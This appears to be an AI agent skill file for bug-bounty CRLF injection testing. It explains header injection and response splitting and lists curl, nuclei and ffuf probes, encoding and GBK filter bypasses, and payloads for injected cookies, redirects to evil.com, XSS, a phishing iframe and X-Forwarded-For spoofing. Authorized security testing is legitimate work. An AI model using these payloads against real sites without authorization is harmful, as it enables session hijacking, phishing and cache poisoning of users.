---
name: crlf-injection-testing
description: CRLF (Carriage Return Line Feed, %0d%0a) injection testing — sending unsanitized `\r\n` sequences into a value that gets reflected into an HTTP response header, letting an attacker inject arbitrary new headers or fully split the response into a second, attacker-controlled response. Enables HTTP response splitting, forced Set-Cookie injection (session fixation), reflected XSS via an injected `Content-Type`/body break, cache poisoning, and open-redirect-via-injected-`Location`. Use this during Phase 3 (Vulnerability Testing — Server-side/Client-side) of bughunting-workflow on any parameter, path segment, or header value that gets echoed back into a response header (redirect location, custom response header, cache-control logic). Also trigger on mentions of CRLF injection, HTTP response splitting, %0d%0a, header injection, or Set-Cookie injection via a parameter.
---

# CRLF Injection Testing

Technique library for HTTP header/response-splitting injection via unsanitized carriage-return/line-feed sequences. Each dated entry below is a validated technique pulled from a real writeup/source — add new entries here (don't create a new skill) whenever a new writeup covers a *different* injection point or downstream escalation than what's already recorded.

## Core theory

HTTP headers are terminated by `\r\n` (CRLF), and the full header block ends with a blank line (`\r\n\r\n`). If user input flows unsanitized into any value the server writes back into a response header — a redirect target reflected into `Location`, a value echoed into a custom header, a cache-key component written into a `Set-Cookie` — and the server doesn't strip/reject `\r`/`\n` characters from that input, an attacker can inject `%0d%0a` sequences to:

- **Inject a whole new header** the application never intended to set (e.g. an attacker-chosen `Set-Cookie`), by terminating the current header line and starting a new one.
- **Fully split the response** by injecting `%0d%0a%0d%0a` (a complete blank-line sequence), ending the header block early and writing arbitrary content — including a second fake HTTP response — into what the client parses as the response body, which is the classic "HTTP response splitting" primitive and can be escalated to reflected XSS if the injected body content includes a script and the response `Content-Type` allows HTML rendering.

**Recon signal:** any parameter/path segment that shows up verbatim in a response header — redirect endpoints (`Location`), any custom application header that mirrors a request value, cache-related headers, or anywhere a value that "looks like" it should only affect the body actually also affects a header.

## Detection & exploitation

**Basic injection probe** — inject a forced cookie via a path segment or parameter that's reflected into a response header:
```bash
curl -I "https://domain.com/%0aSet-Cookie:coffin=hi;"
```
A `Set-Cookie: coffin=hi;` header appearing in the response that the application never explicitly set confirms the injection — the raw `%0a` (or `%0d%0a`) in the request path/parameter reached the header-writing code unsanitized.

**Automated detection:**
```bash
cat domains.txt | nuclei -t cRlf.yaml -rl 50 -c 30
```
`-rl 50` rate-limits to 50 req/s — CRLF probes are cheap and easy to run at high concurrency (`-c 30`) without needing to slow down for WAF evasion, unlike heavier injection classes.

**Escalation checklist once basic injection is confirmed:**
1. **Session fixation via forced `Set-Cookie`:** if the injected cookie is actually accepted and later trusted by the application (not just reflected), an attacker can pre-set a victim's session identifier via a crafted link, then hijack the session once the victim authenticates under the attacker-known value.
2. **Full response splitting → reflected XSS:** try `%0d%0a%0d%0a<script>...</script>` to terminate the header block early and inject an HTML/script body directly — works only against older server/proxy stacks that don't independently re-validate the header block, but worth testing on any legacy-looking stack (older IIS/Apache modules, custom reverse proxies).
3. **Cache poisoning:** if a CDN/reverse-proxy caches responses and the injected header affects a cache-relevant directive (or the split response itself gets cached), the poisoned response can be served to other visitors — cross-reference `web-cache-deception-testing`/`host-header-injection-testing`'s cache-poisoning sections for the broader caching-layer methodology once CRLF gets you a poisoned response.
4. **Open redirect via injected `Location`:** if the same injection point also lets you inject a full `Location:` header, this collapses into a straightforward open redirect — cross-reference `open-redirect-testing`.

## Payload catalog by category

**Encoding variants** (try all when a naive filter blocks the bare `%0d%0a`):
```
%0d%0a           # standard CR+LF
%0a              # LF alone — some parsers only strip CR
%5Cr%5Cn         # literal backslash-r-n, catches filters that only decode %XX once
%23%0a           # hash+LF combo
%%0a0a           # double-URL-encoded LF — decodes to %0a0a on the first pass, %0a on the second
```

**GBK/multi-byte encoding bypass** (defeats filters/WAFs that block the literal `%0d%0a` byte sequence but don't account for multi-byte character-set decoding upstream of the filter):
```
嘍 = %E5%98%8D   # interpreted as CR after GBK decoding
嘊 = %E5%98%8A   # interpreted as LF after GBK decoding
/%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=coffinxp
```
Same trick extends to XSS-chaining payloads when the target's decoding pipeline treats these as `<`/`>` too: `< = %E5%98%BC`, `> = %E5%98%BE`.

**Header injection:**
```
%0d%0aX-Injection-Test: injected
%0d%0aSet-Cookie: hacked=true;
```

**Open redirect via injected `Location`:**
```
%0d%0aLocation: https://evil.com
/%0d%0aLocation: www.evil.com
```

**XSS-protection-header neutering** (disable the browser's own defense before delivering a script payload):
```
%0d%0aX-XSS-Protection:0
```

**Full response split → HTML/script injection** (double-CRLF to end the header block early):
```
%0d%0a%0d%0a<script>alert('XSS')</script>
%0d%0a%0d%0a<img src=x onerror=prompt(1)>
%0d%0a%0d%0a<svg onload=alert(document.domain)>
```

**Full-page iframe injection** (phishing overlay rather than a script alert — visually replaces the entire page with attacker-chosen content):
```
%0d%0a%0d%0a<iframe src="https://attacker-controlled-page/" style="border:0;position:fixed;top:0;left:0;right:0;bottom:0;width:100%;height:100%">
```

**Full HTTP response splitting** (inject a complete second HTTP response inside the first):
```
/vulnerable-endpoint?q=abc%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert('Split!')</script>
```

**Combined chain example** (`Location` clearing + custom header + content-type override + XSS-protection disable + script, all in one injection point):
```
/%3f%0d%0aLocation:%0d%0acoffin-x:coffin-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>
```

## Burp Suite manual workflow

1. Intercept a request with a reflected parameter (e.g. `?page=home`).
2. Send to Repeater.
3. Modify the parameter value: `home%0d%0aSet-Cookie:injected=1`.
4. Inspect the response headers for the injected `Set-Cookie` (or whichever header you targeted) appearing where the application never set it.
5. Once confirmed, iterate through the payload catalog above from that same Repeater tab rather than re-intercepting each time.

## Mass-scanning tool

**Loxs** (GitHub: `coffinxp/loxs`) — multi-vuln-class mass scanner covering SQLi, CRLF, XSS, LFI, and Open Redirect detection across a target list in one tool, useful as a first triage pass before manual payload-catalog testing on whatever it flags.

## Recorded techniques

### 1. Basic CRLF detection via forced Set-Cookie + nuclei template (baseline)
Source: [My Private Nuclei Template Collection for Easy Bounties](https://meetcyber.net/my-private-nuclei-template-collection-for-easy-bounties-ba704073d065)

**Where:** any endpoint reflecting a path segment or parameter into a response header — most commonly seen on custom routing/redirect logic rather than framework-default header handling.

**Root cause:** the server writes user-controlled input directly into a response header without stripping `\r`/`\n`, so `%0d`/`%0a` in the input terminates the current header and lets the attacker author the next line(s) of the response themselves.

**Exploit steps:** probe with the forced-`Set-Cookie` curl one-liner above; if it lands, run the escalation checklist (session fixation, full response splitting to XSS, cache poisoning, open-redirect-via-`Location`) against the same injection point rather than stopping at "header injection confirmed."

**Impact framing for report:** severity is driven entirely by which escalation lands — bare header injection with no further effect is Low/Info; session fixation or reflected XSS via response splitting is High; cache poisoning affecting other visitors is High/Critical depending on scale. Always demonstrate the specific downstream escalation, not just the raw `Set-Cookie: coffin=hi;` proof.

**Generalize note:** this is the same "unsanitized input reaches a structurally significant delimiter" root cause as HTTP Parameter Pollution and Host header injection — any place a raw value crosses from "just data" into "part of the protocol's own syntax" is worth testing with the structural character specific to that syntax (`&`/duplicate keys for HPP, `\r\n` here, `;`/path-parameter delimiters for path confusion).

### 2. Full payload catalog, GBK encoding bypass, and Burp/mass-scan workflow
Source: [Master CRLF Injection: The Underrated Bug with Dangerous Potential](https://infosecwriteups.com/master-crlf-injection-the-underrated-bug-with-dangerous-potential-33bb0d62e031)

**Where:** same injection points as entry #1 — this refines *how* to find and escalate them rather than a new injection point class.

**Root cause:** same as entry #1; this source adds the specific detail that filters blocking the literal `%0d%0a` byte sequence can still be bypassed if the server's character-decoding pipeline runs a multi-byte charset (GBK) decode *before* the filter's check — the GBK-encoded characters 嘍/嘊 decode to CR/LF only after that charset conversion, invisible to a filter that only pattern-matches the raw bytes.

**Exploit steps:** run the payload catalog above by category (encoding variants → GBK bypass if the standard encoding is filtered → header injection → Location/open-redirect → XSS-protection-neutering → full response-split HTML/script/iframe injection), using the Burp Repeater workflow for manual iteration and `nuclei -t cRlf.yaml` or the **Loxs** tool for scale across many targets/parameters at once.

**Impact framing for report:** the iframe-injection variant specifically enables a full-page phishing overlay (not just a script `alert()`) — frame that as a distinct, higher-social-engineering-impact escalation from plain reflected XSS when reporting, since it lets an attacker present a completely fabricated page (e.g. a fake login form) while the URL bar still shows the legitimate domain.

**Generalize note:** the GBK/multi-byte-encoding bypass technique generalizes beyond CRLF specifically — any input filter implemented as a byte-pattern match (not a check performed *after* all charset/encoding normalization has already happened) is a candidate for the same class of bypass. Keep this in mind for XSS filter bypass generally (`csp-misconfig-xss-testing`/`blind-xss-testing`), not just CRLF.

### 3. Escalation chains beyond response splitting: SSRF via header injection, request smuggling, OAuth token theft — plus ffuf detection and additional encoding variants
Source: [CRLF Injection: Real-World Exploitation & Reporting (Part 3/3)](https://freedium-mirror.cfd/https://medium.com/@cybersecplayground/crlf-injection-real-world-exploitation-reporting-p-3-3-1da1d5fbfdd2)

**Where:** same injection points as entries #1/#2; this source's contribution is three escalation chains not yet covered by the existing escalation checklist above, plus a couple of encoding variants and a dedicated ffuf-based detection command.

**Additional encoding variants** (add to the catalog above when the standard/GBK encodings are filtered):
```
%250d%250a       # double URL-encoding — decodes to %0d%0a only after two passes, catches filters that decode once and check
%E2%80%A8        # Unicode line separator (U+2028) — some HTML/JS parsers treat this as a line terminator independent of \r\n
```

**Escalation A — CRLF → SSRF/internal-access bypass via injected `X-Forwarded-For`:** if the injection point lets you add an arbitrary header (not just a `Set-Cookie`), inject `X-Forwarded-For: 127.0.0.1` (or another trusted-range IP) as the new header line:
```
GET /some-endpoint HTTP/1.1
Host: target.com
X-Injected-Header: value%0d%0aX-Forwarded-For:%20127.0.0.1
```
**Vulnerable if:** an internal-IP-allowlist check downstream (an admin panel, an internal API, a feature gated to "requests from localhost") reads `X-Forwarded-For` to decide trust and accepts the CRLF-injected value — this collapses CRLF injection into an IP-allowlist bypass, which is functionally the same outcome as `ssrf-testing`'s and `403-bypass-testing`'s trusted-header-spoofing techniques, just reached via a CRLF injection point instead of directly setting the header on a request you control end-to-end. Cross-reference those two skills for what to do once the bypass lands (internal service probing, admin-panel access) rather than treating this as a new exploitation methodology — the CRLF part is only the *delivery mechanism* for a header-spoofing bypass those skills already cover in depth.

**Escalation B — CRLF → HTTP Request Smuggling (chain pointer, not yet a standalone technique in this skill set):** the source frames CRLF injection as one way to construct a smuggled second request when front-end and back-end components disagree on request boundaries (the same "parser confusion between two pipeline components" root cause `http-parameter-pollution-testing`'s Core theory already names as the general pattern behind HPP/cache-poisoning/desync bugs). **Known gap:** neither this skill nor any other topic skill currently has a dedicated HTTP Request Smuggling methodology (CL.TE/TE.CL/TE.TE detection, Burp's smuggling-detection workflow, desync PoC construction) — this entry flags it rather than fabricating one; add a proper `http-request-smuggling-testing` skill (or a recorded technique here) when a source demonstrating the actual smuggling mechanics, not just the CRLF-as-one-input-vector framing, gets processed.

**Escalation C — CRLF → OAuth token theft via `redirect_uri` manipulation:** if an OAuth flow's `redirect_uri` parameter is itself reachable via a CRLF-injectable endpoint (or the injected headers let you redirect the auth-code/token callback), the CRLF primitive becomes a delivery mechanism for redirecting the OAuth callback to attacker-controlled infrastructure — functionally the same attack `oauth-redirect-uri-bypass-testing` already covers via direct `redirect_uri` tampering, just reached through a CRLF injection point on an endpoint that happens to sit in the OAuth flow rather than by manipulating `redirect_uri` directly. Cross-reference that skill for the full token-interception/account-takeover chain once the redirect is achievable.

**Detection via ffuf:**
```bash
ffuf -w crlf_payloads.txt -u https://target.com/search?q=FUZZ -mr "Set-Cookie" -ac
```
`-mr "Set-Cookie"` matches on the injected header actually appearing in the response (rather than matching by status code, which won't change for a successful CRLF injection) — `-ac` auto-calibrates to filter the baseline noise. Adds a fourth detection option alongside the existing curl one-liner, `nuclei -t cRlf.yaml`, and Burp's active scanner/CRLF extension.

**Remediation detail for reports:** cite a concrete server-side fix alongside the generic "sanitize input" framing — `preg_match('/[\r\n]/', $input)` (or the equivalent in the target's language) rejecting any input containing a raw CR/LF before it reaches header-writing code, in addition to URL-encoding output and maintaining a redirect-target allowlist.

**Impact framing for report:** this source's bounty-value framing reinforces entry #1's point — value comes from demonstrating the specific chain (which of session hijacking / SSRF-bypass / smuggling / OAuth-token-theft actually lands), user-wide reach, and account-takeover capability, not from the bare header-injection primitive alone.

**Generalize note:** the throughline across all three escalation chains in this entry is the same: CRLF injection is rarely the *end* of the finding, it's a *delivery mechanism* for whatever a directly-controlled version of the same header/parameter would achieve — cross-reference the dedicated skill for that downstream primitive (`ssrf-testing`/`403-bypass-testing` for header-spoofing bypasses, `oauth-redirect-uri-bypass-testing` for OAuth redirect manipulation) rather than re-deriving that skill's methodology from scratch once CRLF gets you write-access to an arbitrary header.

<!-- Add new recorded techniques below this line as new CRLF-injection writeups are processed. Keep the same structure: Where / Root cause / Exploit steps / Impact framing / Generalize note. -->
